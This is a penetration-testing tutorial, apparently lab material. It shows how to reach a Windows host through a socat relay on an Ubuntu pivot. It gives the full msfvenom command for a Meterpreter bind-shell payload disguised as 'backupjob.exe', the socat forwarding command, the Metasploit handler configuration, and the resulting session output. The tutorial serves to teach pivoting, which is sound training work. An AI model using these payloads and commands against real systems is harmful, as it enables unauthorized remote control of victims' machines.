# Socat Redirection with a Bind Shell

The bind shell variant of socat redirection reverses the connection direction compared to the reverse shell approach. Rather than the target reaching out to the pivot, the attacker reaches inward through the pivot to a listener already running on the target. This is useful in environments where inbound connections to the attacker's IP are blocked but the attacker can initiate connections into the internal network through the pivot.

## Reverse Shell vs Bind Shell Direction

With the reverse shell approach, the Windows host initiates the connection outward to the Ubuntu server, and socat redirects it to the attacker. With a bind shell, the Windows host opens a listener and waits -- the attacker initiates the connection inward through socat to reach it. The Ubuntu server still sits in the middle as the relay, but the direction of the initial connection is flipped.

## Step by Step

### Step 1 -- Create the Bind Shell Payload for Windows

The payload uses `bind_tcp` rather than `reverse_tcp` or `reverse_https`. No `LHOST` is needed because the payload is not calling back anywhere -- it is opening a listener on the Windows machine itself:

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

The Windows host will listen on port 8443 once this payload executes.

### Step 2 -- Start the Socat Bind Redirector on the Pivot Host

On the Ubuntu server, socat listens for incoming connections from the attacker on port 8080 and forwards them to the Windows target at port 8443:

```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

The attacker connects to the Ubuntu server at port 8080. Socat takes that connection and relays it to the Windows host at 172.16.5.19:8443, where the bind payload is already listening.

### Step 3 -- Configure the Metasploit Bind Handler

The bind handler does not listen -- it connects outward to the target. `RHOST` is set to the Ubuntu server's external IP and `LPORT` to the socat listener port (8080), because from Metasploit's perspective that is the address it is connecting to:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

Once the payload is executed on the Windows host and Metasploit runs the bind handler, the session is established:

```
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

The session shows the connection to `10.129.202.64:8080` (the Ubuntu server's socat listener), not to `172.16.5.19:8443` directly. Socat is transparent to both sides.

## Bind vs Reverse Shell Socat Comparison

| Aspect | Reverse Shell Redirect | Bind Shell Redirect |
|---|---|---|
| Who initiates the connection | Target connects outward to pivot | Attacker connects inward through pivot |
| Payload type | `reverse_https` or `reverse_tcp` | `bind_tcp` |
| Socat forward direction | Inbound from target to attacker | Inbound from attacker to target |
| Useful when | Target can reach pivot outbound | Attacker can reach pivot, pivot can reach target |
| Handler setting | `LHOST` and `LPORT` on attacker | `RHOST` (pivot IP) and `LPORT` (socat port) |

The bind shell approach is particularly effective in scenarios where strict egress filtering prevents the Windows host from initiating outbound connections, but the attacker can reach the Ubuntu server's exposed ports and the Ubuntu server has unrestricted internal access to the `172.16.5.0/23` segment.
